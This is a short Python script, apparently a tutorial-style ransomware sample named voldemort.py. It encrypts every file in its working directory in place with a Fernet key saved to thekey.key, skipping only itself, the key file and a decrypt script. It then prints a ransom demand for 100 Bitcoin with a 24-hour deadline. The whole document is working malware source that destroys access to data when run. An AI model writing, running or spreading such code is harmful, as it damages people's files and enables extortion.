#!/usr/bin/env python3

#Import os and Fernet!

import os
from cryptography.fernet import Fernet

#Let's find some files!
#Ensure you not to encrypt the importent stuff!

files = []

for file in os.listdir():
	if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

#Gernerate the Key!

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

#Encrypt files!

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)


#Post your Loveletter!

print("All your files have been encrypted! Send me 100 Bitcoin or I'll delete them! You have 24h! Have a nice day! :)")
